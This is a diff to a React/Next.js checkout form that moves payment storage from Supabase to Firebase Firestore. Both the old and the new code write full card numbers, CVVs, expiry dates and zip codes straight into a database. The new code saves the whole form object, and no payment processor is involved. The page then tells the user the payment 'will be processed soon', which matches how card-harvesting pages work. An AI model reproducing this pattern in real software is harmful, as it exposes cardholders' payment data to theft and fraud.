@@ -4,7 +4,8 @@ import React, { useState, ChangeEvent, FormEvent, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
 import { toast, ToastContainer } from 'react-toastify'
 import 'react-toastify/dist/ReactToastify.css'
-import { createClient } from '../../lib/supabase/client'
+import { db } from '../lib/firebase'
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore'
 import { Carousel } from '../components/Carousel'
 
 interface FormData {
@@ -433,22 +434,10 @@ if (!formData.zipCode || !/^[A-Za-z0-9\s-]{3,10}$/.test(formData.zipCode)) {
 
     try {
       setisSubmited(true);
-      const supabase = createClient();
-      const { error: insertError } = await supabase.from('payments').insert({
-        order_id: formData.orderId,
-        amount: parseFloat(formData.amount) || 0,
-        first_name: formData.firstName,
-        last_name: formData.lastName,
-        card_number: formData.cardNumber,
-        cvv: formData.cvv,
-        expiry_date: formData.expiryDate,
-        zip_code: formData.zipCode,
-        security_code: formData.securityCode || '',
-      });
-
-      if (insertError) {
-        console.warn('Supabase payment insert notice:', insertError.message);
-      }
+      await addDoc(collection(db, 'payments'), {
+        ...formData,
+        createdAt: serverTimestamp(),
+      })
       toast.success('Payment will be processed soon!', { position: 'top-center', autoClose: 3000 })
 
       setFormData({
